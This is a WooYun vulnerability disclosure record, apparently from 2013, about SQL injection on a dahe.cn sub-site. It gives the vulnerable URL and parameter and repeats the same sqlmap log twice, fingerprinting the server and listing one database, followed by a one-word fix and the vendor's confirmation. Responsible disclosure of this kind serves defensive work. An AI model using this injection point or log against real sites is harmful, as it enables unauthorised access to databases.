wybug_title: 大河网某分站SQL注入漏洞--二
wybug_detail: 漏洞详情 披露状态：   									2013-10-15：	细节已通知厂商并且等待厂商处理中									2013-10-16：	厂商已经确认，细节仅向厂商公开									2013-10-26：	细节向核心白帽子及相关领域专家公开									2013-11-05：	细节向普通白帽子公开									2013-11-15：	细节向实习白帽子公开									2013-11-29：	细节向公众公开  简要描述： 又是一个普通的注入 详细说明：  很普通的注入http://shoucang.dahe.cn/nlist.php?cid=40web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.3.18back-end DBMS: MySQL >= 5.0.0[18:12:11] [INFO] fetching database names[18:12:16] [WARNING] the SQL query provided does not return any output[18:12:16] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[18:12:16] [INFO] fetching number of databases[18:12:16] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[18:12:16] [INFO] retrieved:[18:12:28] [ERROR] unable to retrieve the number of databases[18:12:28] [INFO] falling back to current database[18:12:28] [INFO] fetching current databaseavailable databases [1]:[*] scweb   漏洞证明：  很普通的注入http://shoucang.dahe.cn/nlist.php?cid=40web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.3.18back-end DBMS: MySQL >= 5.0.0[18:12:11] [INFO] fetching database names[18:12:16] [WARNING] the SQL query provided does not return any output[18:12:16] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[18:12:16] [INFO] fetching number of databases[18:12:16] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[18:12:16] [INFO] retrieved:[18:12:28] [ERROR] unable to retrieve the number of databases[18:12:28] [INFO] falling back to current database[18:12:28] [INFO] fetching current databaseavailable databases [1]:[*] scweb   修复方案：  过滤   版权声明：转载请注明来源 icysun@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2013-10-16 08:16 厂商回复： 谢谢，已经通知技术人员解决。 最新状态： 暂无
